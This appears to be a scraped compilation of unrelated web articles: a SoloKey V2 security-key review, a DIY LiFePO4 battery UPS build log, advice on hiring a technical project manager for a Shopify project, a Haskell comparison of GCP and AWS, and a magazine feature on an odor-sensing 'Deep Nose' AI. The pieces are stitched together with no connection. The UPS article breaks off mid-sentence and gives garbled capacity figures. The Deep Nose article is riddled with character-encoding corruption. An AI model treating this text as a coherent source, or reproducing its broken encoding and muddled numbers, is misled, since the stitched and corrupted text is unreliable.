<p>A few day’s ago, i received an email from the SoloKeys team. They invited me to look at the new hardware revision of the Solokey just along with the Kickstarter project that was started to fund this new hardware version.</p>
<p>I exepted their invitation, and here is what they send to me:</p>
<p><img src="https://opensecure.nl/img/blog-img/SoloV2-full.jpeg"></p><ul>
<li>The Solokey (USB-A)</li>
<li>8 colorfull skin’s for the key</li>
<li>A nice Sticker</li>
</ul>

<h4 id="a-small-physical-comparison">A small physical comparison</h4>
<p>The previous USB-C Solokey was really thin in comparison to the previous USB-A version.
The new USB-A version of the Solokey looks even a tiny bit thicker and also is missing the physical click-dome button. Instead, the new version has metal contacts on each side of the key.
So no need to force press on the Solokey while it is in the USB port. This is a nice new feature.</p>
<p>Here are the old and new versions side by side:</p>
<p><img src="https://opensecure.nl/img/blog-img/SoloC1.jpeg">
<img src="https://opensecure.nl/img/blog-img/SoloC2.jpeg"></p><pre><code>Left    : The new SoloV2
Middle  : The Solo USB-A 
Right   : The Solo TAP USB-C
</code></pre><div><p>you can clearly see the metal contacts on the side of the key, and in my tests they are very responsive. A slight touch of the contact and your auth request gets processed.
</p></div>
<h4 id="nfc-via-ios-safari-with-webauthnio">NFC via IOS Safari with webAuthn.io</h4>
<p>So of course i immediately tested the new NFC functinality on both my onePlus and iPhone mobile devices.
And YES!!! NFC works all the time. You have to be accurate when placing the key on the back of your phone, but is working as it should. Even with a leather phone case on the iPhone it works flawlessly.</p>
<p>Here you can see the success message on registering my key on webAuthn.io :</p>
<p><img src="https://opensecure.nl/img/blog-img/u2f-success.png"></p><h4 id="nfc-via-ios-safari-with-nextcloud">NFC via IOS Safari with Nextcloud</h4>
<p>I also tested it on my nextcloud test instance. I added the key in the settings, and surely was able to login to nextcoud with my key plugged in my laptop and just a little touch on the back side of the Solokey. Nice !!</p>
<div><p>Next, i tested if i was able to login from my iPhone on the same test nextcloud instance, but now with NFC. Unfortunately Nextcloud gave an error shown below. I’m not sure what the problem is there, but it sure isn’t the NFC functionality, as that is working on several different test sites that i tested.
</p></div>
<p><img src="https://opensecure.nl/img/blog-img/u2f-not-supported.jpeg"></p>
<h4 id="solokey-action">SoloKey Action</h4>
<p>Here is a little picture of the SoloKey in action. The green LED truns bleu when you touch the metal contacs. A nice little feedback to know you touched it.</p>
<p><img src="https://opensecure.nl/img/blog-img/SoloAction.jpeg"></p>
<h4 id="thanks-solokeys-team">Thank’s SoloKeys Team</h4>
<p>So thats it.<br>
A little preview of the new SoloKey.</p>
<p>I want to thank the Solokeys team for putting in all the effort for creating a much needed Opensource Security Key. And also for providing this preview key so i was able to test it, and give feedback.
I’m sure i will come across some little things that could be a bit more polished, and if so, provide the team with feedback.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Power cuts have become a common occurrence around here, under the glamorous title of “<a href="https://www.capetown.gov.za/Family%20and%20home/Residential-utility-services/Residential-electricity-services/Load-shedding-and-outages">load-shedding</a>“. The local electrical utility has, for <a href="https://en.wikipedia.org/wiki/South_African_energy_crisis">some years, and for many historical reasons</a>, experienced periodic trouble meeting the demands placed upon the electricity network. It doesn’t happen all that often, but when it does, my area tends to go dark for about two hours, once or twice a day. This has led to a number of equipment failures; most of my equipment is behind some form of <span>UPS</span>, but most UPSes are designed to bridge less than five minutes of electrical outage, and not two&nbsp;hours.</p>
<p>So, I needed something a little more beefy for all my networking and storage equipment. Lockdown&nbsp;project!</p>
<p>After about two months of research (bigger off-the-shelf <span>UPS</span>? Extension packs?), I decided that I could build my own <span>UPS</span> that would last longer and be cheaper than the alternatives available to me. The Tesla Powerwall system has spawned a number of <a href="https://www.youtube.com/user/nocrf50here">homegrown</a> <a href="https://www.youtube.com/user/jehugarcia">imitators</a>, and the load-shifting design of the Powerwall met my needs&nbsp;precisely.</p>
<p>Moreover, by building a <span>DC</span> <span>UPS</span>, I could skip the conversion from <span>DC</span> and back to <span>AC</span>, which seems to account for a significant amount of power draw in most off-the-shelf UPSes; since all the essential equipment runs off either 12V (in the case of the network-attached storage/<span>NAS</span> and the network hub) or 24V <span>DC</span> (for the network router), or 5V <span>DC</span> for the Raspberry Pi, there was no need for <span>AC</span> power. The system was originally designed for 12V power, and so I chose a 4S configuration for the batteries, which ended up working well, even with the late addition of 24V output. The necessary&nbsp;components:</p>
<ul>
<li><a href="https://www.lithiumbatterypcb.com/product/4s-or-3s-12v-li-ion-or-lifepo4-battery-smart-bms-with-bluetooth-function-uart-and-rs485-communication-with-60a-to-120a-constant-current/">A battery management system</a> (<span>BMS</span>). This <span>BMS</span> handles the chosen 4S/12V configuration, has very large heat sinks, and is adjustable via Bluetooth. Having an adjustable configuration was important: I wanted to adjust the maximum and minimum battery voltages in order to prolong battery life as long as possible. (I also got the <span>RS485</span> <span>UART</span> adapter, which now reads the <span>BMS</span> state for&nbsp;Prometheus/Grafana.)</li>
<li>An <a href="https://www.communica.co.za/products/psu-swmmc-24v-12-5a"><span>AC</span>/<span>DC</span> adapter</a>, converting from 110/<span>220VAC</span> to <span>24VDC</span>. The one I ended up getting was pretty chunky, accepting a fairly high wattage, and including a fan for when power is drawn. I chose 24V rather than 12V because the LiFePO4 cells operate at 12.7V to 14V, so 14V is needed to ensure that the cells will take power. It was also important to ensure that the adapter couldn’t backfeed into the&nbsp;grid!</li>
<li>2 x <a href="https://www.botshop.co.za/product/300w-step-down-power-module-9a/">9A/300W <span>DC</span> step-down converters</a>, one to convert incoming 24V to a 14V constant charge profile for the battery, and one to regulate outgoing power at a stable 12V for 12V equipment (as the battery voltage could vary between 12.7V for discharged 4S LiFePO4 cells, and 14V for fully charged cells). These were massively overspecced (max current draw by the <span>BMS</span> is 1.2A @ 12V) to ensure good heat&nbsp;performance.</li>
<li>1 x <a href="https://www.botshop.co.za/product/150w-boost-converter-dc-dc-step-up-module/">10A/150W <span>DC</span> step-up converter</a>, to convert from the battery’s 12.7-14V to a stable 24V, for powering 24V equipment. Again, overspecced for those sweet sweet&nbsp;heatsinks.</li>
<li>1 x <a href="http://www.xtcomp.co.za/index.php?route=product/product&amp;product_id=362">3A/5V <span>DC</span>-<span>USB</span> step-down converter</a>. This was to charge cellphones in case of a power cut, but now powers a Raspberry Pi that collects stats from the <span>BMS</span> (and other networking&nbsp;tasks).</li>
<li>Copper wiring, solder, battery cell spacers, wood (for a box — I used meranti, which is sufficiently dense to increase its fire-resistance, at least in theory), connectors, terminal blocks, electrical tape, and other&nbsp;consumables.</li>
<li>And batteries! After much research, I decided to try and find <a href="https://en.wikipedia.org/wiki/Lithium_iron_phosphate_battery">Lithium Ferrite Phosphate</a> (LiFEPO4) cells, which have a similar price point to Lithium Ion cells, but are much safer. They have excellent characteristics for this purpose, most important of which (after safety) is that 4 groups of cells (4S) closely matched my original requirement of a 12V system. I was incredibly lucky to find cells from the wonderful <a href="https://www.youtube.com/channel/UCehtnVwfWE0_OflP0dCo9pw"><span>DIY</span> Joe</a>, who had bought a large batch for his own&nbsp;projects.</li>
</ul>
<p>Based mostly on price, I bought 48 <a href="https://en.wikipedia.org/wiki/18650">18650</a> 1.5A cells, for a <span>12P4S</span> (each group having 12 cells in parallel, providing 18A, with 4 groups in series) configuration, providing 72A at a nominal 3.3V, for about 230.4Wh. I had measured the power draw of all the devices I planned to run off the <span>UPS</span>, and come up with a maximum draw of 40W. So 230Wh would give me nearly 6 hours of runtime with all devices running at full power (I haven’t done a full load test yet, but in real-world conditions, I’d estimate runtime is closer to <strong>20 hours</strong>). At its worst, load shedding could be 2 hours, 3 times a day, and there is no guarantee that the time between incidents would be sufficient to fully recharge the&nbsp;cells.</p>
<p>I did quite a bit of research into the dynamics of charging LiFePO4 cells; it appears that the best charge profile is to provide constant current (<span>CC</span>) at 18A (the technical term is C/1; C is the amperage of each group of parallel cells, in this case 18A) until the cell group reaches a charge of 3.6V, and then to provide constant voltage (<span>CV</span>) at 3.6V until the battery is pulling C/24 of current, or 0.75A (some sources say you can stuff your cells to the metaphorical gills, until they can’t take more than C/12, or 0.5A, of current; others offer the more conservative cut-off of C/20, or&nbsp;0.9A).</p>
<p>However, I am not trying to saturate my cells: this is a (hopefully) long-lived and large-celled <span>UPS</span>, not a drone that needs as much power as you can cram into it! So I planned to cut off the charge at the relatively conservative 3.5V (I have since reduced this further to 3.45V), and entirely skip the <span>CV</span> step. In principle, increasing the minimum voltage and reducing the maximum voltage should result in vastly increased lifespan for the battery. So I would adjust the minimum voltage (the point at which the <span>BMS</span> refuses to provide any more power from the cells) on the <span>BMS</span> from 2.7V to 3.175V, and decrease the maximum voltage (the charge cutoff) from 3.65V to&nbsp;3.45V.</p>
<p>The rest of the important values work backwards from this: if we want to charge 3.65V at 18A, we need a charger and <span>BMS</span> that can cope with 65.7W; I picked a 300W charger, and a <span>BMS</span> that maxes out at 120A (so about 6.6 times larger than neccessary: the shipping was sufficiently expensive that it made more sense to get the best <span>BMS</span> I&nbsp;could).</p>

</figcaption></figure>
<p>By early March, I had my cells; I had not yet ordered the <span>BMS</span> or chargers. Of course, at this point, lockdown intervened; I could only order the parts in June! Even if I had ordered in March, it wouldn’t have arrived any sooner than it did, in&nbsp;July.</p>
<p>However, that did at least give me time to unbundle the <span>3P1S</span> units that the batteries arrived in, and repackage them into 4 sets of 12, using battery spacers to keep each set&nbsp;together.</p>
<p>At this stage, I made the biggest mistake of the build: cutting away too much of the existing spot-welded tin strips that connected the three cells together. (Happily by the time I got to the second set of cells, I had learnt my lesson.) Batteries don’t react well to heat, so the best method of wiring up 18650s is to spot weld them with tin strips, which applies a huge amount of heat very quickly. Sadly, I don’t have a spot welder, so it was plain old solder (plus a bit of flux) for me. The remaining tin on the last three sets of batteries was enough to mediate the heat of the solder (and provide a stable base for the solder, so the wires were less likely to disconnect as I progressed and require re-soldering), but the first set, to this day, doesn’t charge quite as well as the other&nbsp;three.</p>
<figure>

<figcaption>
The repackaged cells; the first set of cells that I opened is on the lower left, and lacks the spot-welded tin on the terminals. I also used red and black insulation tape to mark the positive and negative terminals (as the spacers hide the tiny ridge that is the only other indicator) and to reinforce the existing heat-shrink; the blue insulation tape around the middle of each group (only on the first group in this photo) reinforced the joins on the spacers.
</figcaption></figure>
<p>Finally, by mid-June, I was able to place orders for the remaining equipment; most of the items arrived at the end of July. Unfortunately, by this point, I was so eager to get started that photos are few and far in&nbsp;between.</p>
<p>The next step was to wire together the groups of cells into a more permanent 4S configuration. I used fairly thick twisted copper wire as bus bars, with individual strands of copper to each wire, to act as a cheap fuse in case of over-current. (It works quite well; my testing was inadvertent but happily did not set fire to anything, damage any cells, or result in emergency room visits. It also confirmed my fire-proofing safety calculations: well worth the momentary&nbsp;clumsiness!)</p>
<figure>

<figcaption>

</figcaption></figure>
<p>Having wired in the bus bars, I needed to connect the balance cables, which allow the BMs to detect and balance the voltage/charge of each group. Three of the wires go between each group (the white ones), the red and black go at the positive and negative terminal. Since a short-circuit of two 18A cells would be a powerful thing, I added a wooden spacer between the two sets of cells, to ensure that bus bars that should not touch stayed far&nbsp;apart.</p>

<figcaption>
Top bus bars and positive and negative terminals (as yet unmarked).
</figcaption></figure>
<p>Originally, I had arranged the bus bars to ensure that current went in one side (say, top left) and connected to the next cell on the opposite side (bottom right, in this example). This was to ensure that the current went through all the cells approximately&nbsp;evenly.</p>
<p>Later testing suggested that the copper bus bars that I was using weren’t enough to properly balance the batteries (although this may have simply been the use of a single negative wire to the <span>BMS</span>), so I ended up connecting the second row of bus bars, and adding a second set of positive and negative&nbsp;terminals.</p>
<p>In this photo, the terminals have lugs attached; lacking a proper crimping tool for these lugs, I eventually discarded the lugs and switched to using regular terminal blocks, …</p></div></div>

<p>As a developer, my skills are applicable across a wide variety of domains.&nbsp; However,&nbsp; I re-engaged recently with a prospective client that I <a href="https://www.mooreds.com/wordpress/archives/1640">wrote about a while ago</a>. They had used another booking solution over the past few months and still had the same pain.&nbsp; After thinking and doing some research, I can to a conclusion that hiring a developer was not the right answer for them.</p>
<p>This company had an interesting set of constraints:</p>
<ul>
<li>Wedded to a platform (Shopify) because of previous investment and its excellent shopping experience.</li>
<li>The platform doesn’t provide all the functionality needed.</li>
<li>Users (both internal and customers) are ill served by another system to login and manage.</li>
<li>No third party plugins seem to meet the needs, either alone or in combination (at least, no solutions that I could find).&nbsp; It’s apparently a fairly unique problem set.</li>
<li>They were not interested in solving the problem in incremental steps.</li>
<li>They had budget limitations (don’t we all).</li>
</ul>
<p>In this situation, the best solution is to look for someone who can undertake the following steps:</p>
<ol>
<li>Write up a clear description of the problem. This doesn’t have to be a detailed requirements doc, but should be a clear explication of the issues, needs, timelines (if any), and current systems.</li>
<li>Post the description to the <a href="http://ecommerce.shopify.com/forums">shopify forums</a> and contact the platform vendor directly, to see if anyone has encountered any of the same issues and ask how they solved them. The point of this isn’t to solve the problem, it’s to see if anyone else has solved pieces of the problem. This will help the company identify partners and/or adjust scope of the project. (If Shopify customer support says ‘whoa, we’ve never heard of this’, it’s a different size problem than if they say ‘well, you might want to bolt these three pieces together’.)</li>
<li>After the client has more knowledge, send the requirements to <a href="https://experts.shopify.com/developers">Shopify focused dev shops</a> (and possibly <a href="https://www.elance.com/r/contractors/q-shopify/">Elance contractors who work with Shopify</a>, but not just Shopify themes). Work with at least two to three of them to see what a solution would cost, either custom or building on their current code. At this time, avoid getting development quotes from anyone who doesn’t have experience with Shopify development (like me!), simply because the integration with the platform is so critical.</li>
<li>Evaluate the results of the RFP process, including following up any avenues that the experts or forums turn up. Consider whether the budget allows for a comprehensive solution or whether it makes more sense to look at point solutions for the high pain areas.</li>
<li>If the results point to a comprehensive solution being within budget, engage the solution provider.&nbsp; If not, identify the high pain areas and go back to step 1 with the smaller scope.</li>
</ol>
<p>So, what this client really needs is a technical project manager (TPM). While most freelancers have this skill to some degree, as it is hard to survive without it, making a full time living as a contract project manager is difficult. I know of only one person in 15 years who was making a living as a contract project manager (and she’s not doing it anymore). This particular project doesn’t seem like a full time effort, so the client should be able to get by with a moonlighter, at least until the results of step 4 are known.</p>
<p>Good technical project managers are hard to find. From a <a href="http://www.culturefoundry.com/join-us/technical-project-manager">friend’s company’s job req</a> (his company who is looking for a TPM, and the job desc captures the description of the skill set well), they have:</p>
<blockquote><p>balance between hands-on technical knowledge, a ravenous appetite for order, and an understanding of humans and how they work.</p></blockquote>
<p>Developers (or former developers) who want to project manage and have people skills aren’t quite the <a href="https://medium.com/@katherinemartinez/the-unicorn-hybrid-designer-developer-5e89607d5fe0">unicorn</a> as someone who can both design and develop, but they are almost as rare.&nbsp; Unless the company can find a contract project manager who has technical chops, they’ll want to either source this internally or find an external contractor with another skill set (developer or designer) who wants to PM this project.</p>
<p>This is a great chance to for an employee to expand their skill set. Based on my experience managing vendors during my time at 8z (a 4 month website relaunch and a longer term, less time intensive data provisioning engagement), I would advise that this employee have technical skills.&nbsp; Challenging custom solution providers on technical grounds, or at least being able to follow along, ensures the company will get the best solution. This doesn’t work for “take it or leave it” SaaS apps, but this project appears custom enough that the TPM really needs to have both business and technical considerations in mind when managing the development shop. If they are looking for an outside contractor, engaging with a designer or developer who has PM experience would be an option.</p>
<p>As far as stretching budget, proposing a lower price to the development shop in exchange for shared ownership of the code might make sense. The partner could market this code to other clients and recoup some costs, while the client retains a perpetual license.</p>
<p>Sometimes, a generic developer isn’t the right answer for a software development problem. A technical project manager (or someone wearing that hat) can often stretch budget and leverage skill sets of focused development teams.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>About a year ago I quit my job to attempt my startup idea (<a href="https://deadpendency.com/">Deadpendency</a>), writing it in Haskell. One key decision to make was what cloud provider would I go with.</p>

<p>Like many developers, I have a bunch of professional experience developing against Amazon Web Services (AWS). The Haskell community seems to reflect wider industry in that AWS is by far the most popular choice. In fact, myself and a colleague had already managed to get <a href="https://www.rea-group.com/blog/a-haskell-in-prod-journey/">Haskell running in prod on AWS</a> and it was great.</p>

<p>However, I’ve always been in awe of Google products and wanted to try out Google Cloud Platform (GCP). I decided this would be a good opportunity to do so.</p>

<p>tl;dr - Haskell on GCP is great. GCP vs AWS has various trade offs, however I think there are a few reasons why GCP is great for Haskell.</p>

<p>First let’s look at using Haskell on AWS.</p>

<h2 id="aws--haskell">AWS + Haskell</h2>

<h3 id="aws-haskell-library-support">AWS Haskell Library Support</h3>

<p>AWS has the excellent <a href="https://hackage.haskell.org/package/amazonka"><code>amazonka</code></a> library developed by Brendan Hay. This is actually a large set of libraries that support the many many AWS services. The bulk of the libraries are generated from AWS service definitions and thus can easily be kept up to date.</p>

<h3 id="aws-docker-options">AWS Docker Options</h3>

<p>Haskell works really well with Docker. You can build executables with <a href="https://hub.docker.com/_/haskell/">official Haskell images</a>. Then simply embed them in plain old Debain based containers. AWS has numerous Docker based options and they work great.</p>

<h3 id="aws-lambda">AWS Lambda</h3>

<p><a href="https://aws.amazon.com/lambda/">AWS Lambda</a> allows you to run a function in the cloud without having to worry about how it is hosted, or how it integrates with other AWS services. With a bit of config you can configure a whole host of integrations or scaling options and AWS will make it happen.</p>

<p>Lambda is somewhat controversial among developers in my experience. It doesn’t always live up to its motto of <code>Run code without thinking about servers or clusters</code>. Nonetheless, I think it does have a good niche and can be very useful.</p>

<p>Unfortunately Haskell is not directly supported by Lambda. It does support <a href="https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html">custom runtimes</a> and <a href="https://hackage.haskell.org/package/hal">there</a> <a href="https://hackage.haskell.org/package/serverless-haskell">are</a> <a href="https://theam.github.io/aws-lambda-haskell-runtime/">tools</a> for using Haskell on Lambda.</p>

<p>Admittedly, I have not actually used these Haskell on Lambda solutions, but I believe they take more manual effort to set up and use. This to my mind takes away a lot of the simplicity benefits of using Lambda.</p>

<h2 id="gcp--haskell">GCP + Haskell</h2>

<h3 id="gcp-haskell-library-support">GCP Haskell Library Support</h3>

<p>Likewise, GCP has the <a href="https://hackage.haskell.org/package/gogol"><code>gogol</code></a> library developed by Brendan Hay. <code>gogol</code> has the disadvantage that it is a bit less popular (like GCP) than <code>amazonka</code> and is thus a bit less actively maintained. Still, there is nothing preventing you from regenerating the libraries and using them as required. I did this recently to gain support for a new google service.</p>

<p>Overall GCP vs AWS here is mostly moot.</p>

<h3 id="gcp-docker-options">GCP Docker Options</h3>

<p>GCP also has many good solutions with Docker and they work great with Haskell.</p>

<h3 id="google-cloud-run">Google Cloud Run</h3>

<p>The equivalent of AWS Lambda on GCP is <a href="https://cloud.google.com/functions">cloud functions</a>. Cloud functions has much of the same limitations as Lambda and additionally has no custom runtime concept. Haskell cannot run on cloud functions, so a negative strike there.</p>

<p>However, GCP has another service, <a href="https://cloud.google.com/run">cloud run</a>, which could be thought of as <code>AWS Lambda for Docker</code> and is a sweet spot for a niche language like Haskell. You use it by providing a docker container that listens on a port for HTTP requests. You can integrate it with other GCP services to automatically make those requests, then your API just needs to decode (with help from <code>gogol</code>) and handle them.</p>

<p>For example in my usage I have a pipeline of cloud run services connected with <a href="https://cloud.google.com/pubsub">pub sub</a> (similar to AWS kinesis). I do not need any code to have new messages appear as HTTP requests to cloud run.</p>

<p>Additionally, your cloud run services can simply be HTTP APIs, without using any of the integration glue that GCP offers. So it does some of what Lambda does while also being a simple solution to host standalone APIs.</p>

<p>Cloud run is great, especially for niche languages like Haskell. Unlike AWS Lambda Haskell does not become a second class citizen.</p>

<h4 id="what-about-kubernetes">What About Kubernetes?</h4>

<p>Kubernetes sounds cool, but I think it is a complex solution for a complex problem. If you need this complexity Haskell will work nicely, of course. However, I think for most use cases cloud run is the better, simpler choice.</p>

<h3 id="comprehensive-platform-with-vendor-lock-in">Comprehensive Platform (with vendor lock in)</h3>

<p>This one is based on my impressions and I find it hard to include clear examples. Take this with a grain of salt 😉.</p>

<p>GCP more so than AWS seems to focus on fewer, more developed first party products. AWS on the other hand has more products, particularly more managed third party products. As such, on AWS you are probably going to supplement the AWS platform with these third party tools.</p>

<p>Why does this matter to Haskell?</p>

<p>While you are sticking to the core AWS / GCP platform, you know you have excellent library support with <code>amazonka</code> / <code>gogol</code>. When using third party product X, library support can be patchy. GCP helps you avoid this problem with more of a chance of sticking entirely to the GCP platform.</p>

<p>This comes with vendor lock in concerns, but beggars can’t be choosers 😉.</p>

<h3 id="gcp-is-cheap">GCP Is Cheap</h3>

<p>To my mind most Haskell shops are small to medium sized. At this size I think the cost of cloud resources is more of a factor. GCP is cheaper than AWS, particularly for small shops or startups (in my experience).</p>

<p>One reason for this is most of their services include a free tier that you need to exceed before having to pay anything. Cloud run for example, has <a href="https://cloud.google.com/run/pricing">2 million free requests per month (and other free tier limits you may hit)</a>.</p>

<h3 id="deadpendency-architecture">Deadpendency Architecture</h3>

<p>I am working on chopping out a nice skeleton architecture of how I deploy and use GCP for <a href="https://deadpendency.com/">Deadpendency</a>. I hope this will be valuable to others and lower the barrier of using Haskell on GCP and cloud run. Coming soon™️ 😅.</p>

<h2 id="gcp-downsides">GCP Downsides</h2>

<p>So perhaps at this point you’re really keen to start using Haskell on GCP. There are a couple of downsides to GCP when compared to AWS it is good to be aware of.</p>

<h3 id="deployment-as-code">Deployment As Code</h3>

<p>To me the killer feature of AWS is <a href="https://aws.amazon.com/cloudformation">Cloud Formation</a>. GCP has an equivalent in <a href="https://cloud.google.com/deployment-manager">Cloud Deployment Manager</a>, however it is (or was 1 year ago when I tried it) greatly inferior to cloud formation.</p>

<p>This isn’t the end of the world though. It just means <a href="https://www.terraform.io/">terraform</a> is essential on GCP. Terraform has a learning curve and is another abstraction layer to learn, but does also bring some benefits with the complexity. Additionally, Google and Terraform themselves maintain the <a href="https://registry.terraform.io/providers/hashicorp/google/latest">terraform google ‘provider’</a> so it is quite high quality and up to date.</p>

<h3 id="it-is-less-popular">It Is Less Popular</h3>

<p><a href="https://www.parkmycloud.com/blog/aws-vs-azure-vs-google-cloud-market-share/">GCP is growing faster than AWS</a> in terms of percentage year on year revenue growth. However, <a href="https://www.parkmycloud.com/blog/aws-vs-azure-vs-google-cloud-market-share/">AWS is currently 32% of the market, while GCP is only 7%</a>. As Haskellers we know well the costs of using niche languages and products. It is manageable, but you can expect it harder to find answers to your random error message etc.</p>

<p>One nice thing is there are some <a href="https://cloud.google.com/community#home-support">good free channels</a> to get help from GCP employees.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Haskell runs great in Docker and has great library support for AWS and GCP. As such, Haskell can work well on both of them.</p>

<p>However, GCP has a few advantages, in particular cloud run is excellent for hosting APIs or gluing together pipelines with Haskell. I would strongly recommend considering it if you do Haskell, rather than just automatically reaching for AWS 😀.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>I</span>tâ€™s 2050 and youâ€™re due for your monthly physical exam. Times have changed, so you no longer have to endure an orifices check, a needle in your vein, and a week of waiting for your blood test results. Instead, the nurse welcomes you with, â€œThe doctor will sniff you now,â€� and takes you into an airtight chamber wired up to a massive computer. As you rest, the volatile molecules you exhale or emit from your body and skin slowly drift into the complex artificial intelligence apparatus, colloquially known as Deep Nose. Behind the scene, Deep Noseâ€™s massive electronic brain starts crunching through the molecules, comparing them to its enormous olfactory database. Once itâ€™s got a noseful, the AI matches your odors to the medical conditions that cause them and generates a printout of your health. Your human doctor goes over the results with you and plans your treatment or adjusts your meds.</p>

<p>Thatâ€™s how Alexei Koulakov, a researcher at&nbsp;<a href="https://www.cshl.edu/" target="_blank">Cold Spring Harbor Laboratory</a>, who studies how the human olfactory system works, envisions one possible future of our healthcare. A physicist turned neuroscientist, Koulakov is working to understand how humans perceive odors and to classify millions of volatile molecules by their â€œsmellableâ€� properties. He plans to catalogue the existing smells into a comprehensive artificial intelligence network. Once built, Deep Nose will be able to identify the odors of a person or any other olfactory bouquet of interest—for medical or other reasons. â€œIt will be a chip that can diagnose or identify you,â€� Koulakov says. Scent uniquely identifies a person or merchandise, so Deep Nose can also help at the border patrol, sniffing travelers, cargo, or explosives. â€œInstead of presenting passports at the airport, you would just present yourself.â€� And doctorâ€™s visits would become a breeze—literally.</p>
<figure><img src="https://s3.amazonaws.com/nautilus-vertical/cshl_767471bfa3f2088e16d8d3594fb77137.jpg" alt="Screen Shot 2021-02-04 at 2.25.47 AM"><figcaption><span><strong>ODOR &amp; HOOCH: </strong>Peer-reviewed studies show dogs can be trained to detect signature scents of diseases, including cancer and tuberculosis. But in the long run, a â€œsniffingâ€� computer would be more economical and effective. </span><br><span>aswphotos / Shutterstock</span></figcaption></figure>

<p><span>W</span>hat can oneâ€™s odor tell about oneâ€™s health? Apparently, a lot. â€œThe information that can be picked up from the airborne molecules is amazingly rich,â€� says Dmitry Rinberg, also a former physicist and now a neurobiologist at New York University who collaborates with Koulakov on olfactory research. â€œItâ€™s so informative that you can tell what kind of beer people drank at a bar last night.â€� Odor can reveal other things happening with the body, he adds. â€œSo we are trying to use this information for odor-based diagnostic approaches.â€�</p>
<p>Recent research finds that many diseases, including cancer, tuberculosis, and Parkinsonâ€™s, can manifest themselves through volatile compounds that change the personâ€™s scent. Our bodies release certain metabolites—products of our metabolic activities. Some of these molecules are volatiles and become part of our scent, or â€œodorprint.â€� When we become sick or start developing a disease, our metabolic processes start functioning differently, emitting different volatile molecules or mixtures of them, so our odorprint changes too. â€œThese molecules carry information about our state of health,â€� Koulakov says. For example, patients with Parkinson disease produce an unusually high amount of sebum,<sup>1</sup>&nbsp;a waxy lipid-rich biofluid excreted by the sebaceous glands of the skin, which sensitive noses can detect. Deep Nose could grab this information from the thin air. That could allow physicians to detect disease sooner, easier, and perhaps avoid some invasive diagnostic procedures. â€œIt would essentially revolutionize the diagnostics system,â€� Koulakov says.</p>
<blockquote><em>Deep Nose matches your odors to the medical conditions that cause them.</em></blockquote>
<p>Hippocrates, Galenus, Avicenna, and other physicians of ancient times used their noses as diagnostic tools. A wound with a nasty smell could mean it was infected. And bad breath signaled a host of ailments. Today, however, physicians donâ€™t sniff their patients—because humans generally stink at smelling. In fact, we are worse than our ancestors. Our primate predecessors sported about 850 olfactory receptor types, but we retained only 350 functioning ones, which in various combinations allow us to smell an astronomical amount of odors. (The rest of them simply donâ€™t work. â€œThey are the remnants of our former glory,â€� Koulakov quips.) Meanwhile, dogs have about 850 receptor types and mice about 1,100 or 1,200, so they are capable of discerning a much greater variety of smells—including those produced by the malfunctions of our bodies.
</p>
<p>Scientists now use that animal olfactory wealth to diagnose disease—with some documented success and peer-reviewed studies. Recently, a group of scientists from several research institutions presented their results of training three beagles to sniff patientsâ€™ blood samples and detect lung cancer cells in them with 97 percent accuracy.<sup>2</sup>&nbsp;A study published in&nbsp;<em>British Medical Journal</em>&nbsp;stated that dogs were able to detect colorectal cancer by smelling stool.<sup>3</sup>&nbsp;Another paper in&nbsp;<em>BMC Cancer</em>&nbsp;described dogs smelling out ovarian cancer.<sup>4</sup>&nbsp;And African giant pouched rats had been taught to work as â€œtuberculosis diagnosticiansâ€� in Sub-Saharan Africa, sniffing sputum samples from patients. Microscope detection accuracy can vary from about 20 to 80 percent. The ratsâ€™ noses helped improve detection by up to 44 percent.<sup>5</sup></p>

<p>But animal diagnosticians have their problems. First, they must be trained, and training large numbers of animals that donâ€™t live very long is expensive, time-consuming, and somewhat futile. Plus, every time youâ€™d want to add yet another disease scent to their analytic arsenal, youâ€™d have to train all of them again. â€œThe use of animals for actual diagnostics is very limited,â€� Rinberg says.</p>
<p>That led scientists to ponder the possibility of an electronic nose instead. It would be far more economical to build an artificial sniffer apparatus that wouldnâ€™t die after a few years, with standard software that can be updated regularly across all the board. And thatâ€™s how Koulakov envisions Deep Nose—an electronic olfactory AI that can function as a nose that picks up scents and as a brain that interprets them. That, of course, is no easy feat. Deep Nose is modeled after the neuro-machinery of the human brain, but scientists have yet to figure out how the human brain identifies one scent from another.</p>

<p><span>B</span>iologically, the act of smelling is more complex and less understood than our ability to see. Recognizing a scent is a precise and intricate process in which chemistry, biology, and physics must play together in a synchronized concerto—whether youâ€™re relishing the aroma of a rose or pinching your nose at a pile of dog poop.</p>
<p>Inside your nasal cavity, millions of olfactory neurons are waiting for the next smelly molecule to fly in. These neurons have microscopic finger-like protrusions called cilia, which float in the mucus covering the surface of the nasal epithelium. The neuronsâ€™ other ends, called axons, stretch upward, passing through special passages inside the skull all the way to the brain, leading to the region called the olfactory bulb, named so for its onion-like shape. When molecules fly into our nose, they bind to the cilia, and the neurons send this information to the olfactory bulb, which interprets it, resulting in our sensation of the smell. It would also pass these signals to the olfactory cortex, whose neuro-machinery would determine the quality and the concentration of the smells.</p>

Darker red colors correspond to more activity. </span><br><span>Courtesy of Dr. Hiro Nalkayama, Rinberg Lab, NYU Neuroscience Institute</span></figcaption></figure>
<p>Some molecules bind to certain receptors but not to others. Depending on the specific combination of receptors the molecules lock onto, we would smell roses or dog poop. But even that seemingly simple molecular handshake remains mysterious. Some scientists believe in the â€œsteric binding theory,â€� which states that the molecules fit receptorsâ€™ distinct physical shapes. Others support the â€œvibrational theoryâ€� that purports that olfactory receptors detect the moleculesâ€™ vibrational frequency and â€œtranslateâ€� them into odors. â€œThe steric theory suggests that there is a binding pocket of a particular shape, and some molecules will fit there, while others may swim away in the mucus,â€� Koulakov says.<br></p>
<p>Regardless of which theory proves correct, Deep Nose builders still face a huge challenge. The nose part, which would mimic the neuronal binding action, will require chemical sensors. These sensors will interact with the flying molecules—whether by binding or a different method—and detect their presence. The sensors will then send electrical signals to the electronic brain—the Deep Nose network that will interpret what molecules have been detected. Koulakov envisions it functioning as a network of multiple layers that will be able to recognize different parts of the molecules and different chemical groups within them—just like different neurons react to the presence of different molecules inside biological brains.</p>
<blockquote><em>Dogs have been taught to smell cancer and rats have been taught to work as â€œtuberculosis diagnosticians.â€�</em></blockquote>
